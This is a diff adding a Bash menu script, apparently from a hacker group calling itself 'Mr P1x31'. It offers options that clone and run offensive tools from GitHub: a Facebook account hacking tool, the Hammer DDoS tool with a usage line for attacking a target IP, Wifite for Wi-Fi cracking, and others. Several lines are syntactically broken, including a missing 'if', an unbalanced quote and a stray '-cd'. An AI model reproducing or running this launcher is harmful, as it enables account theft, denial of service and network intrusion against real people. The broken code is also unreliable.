@@ -1,0 +1,70 @@
+GNU nano 4.3                       P1x31.sh
+clear
+sl
+
+figlet Mr P1x31 | lolcat
+
+echo "============================
+
+#Author:xXx
+#Team:Mr P1x31
+
+==================================" | lolcat
+
+sleep 2
+
+echo"[1]Osif
+[2]Hack Fb
+[3]Ddos Attack
+[4]Wifite
+[5]Kkktp" | lolcat
+
+echo "[*]Pilih nomor : " | lolcat
+read nomor
+
+if [ $nomor = 1 ] || [ $nomor = 01 ]
+then
+clear
+git clone https://github.com/CiKu370/OSIF.git
+pip2 install -r requirements.txt
+cd OSIF
+python2 osif.py
+fi
+
+if [ $nomor = 2 ] || [ $nomor = 02 ]
+then
+clear
+git clone http://github.com/pirmansx/mbf
+ls
+cd mbf
+python2 MBF.py
+fi
+
+if [ $nomor = 3 ] || [ $nomor = 03 ]
+then
+clear
+git clone https://github.com/cyweb/hammer
+ls
+cd hammer
+python hammer.py
+echo "=====================================
+#Ketik:python hammer.py -s( ip yang di hack )-p 80 -t 135" | lolcat
+===========================================" | lolcat
+fi
+
+f [ $nomor = 4 ] || [ $nomor = 04 ]
+then
+clear
+git clone https://github.com/derv82/wifite
+cd wifite
+chmod 777 wifite.py
+python2 wifite.py
+fi
+
+if [ $nomor = 5 ] || [ $nomor = 05 ]
+then
+clear
+git clone https://github.com/IndonesianSecurity/kkktp
+-cd kkktp
+php kkktp.php
+fi
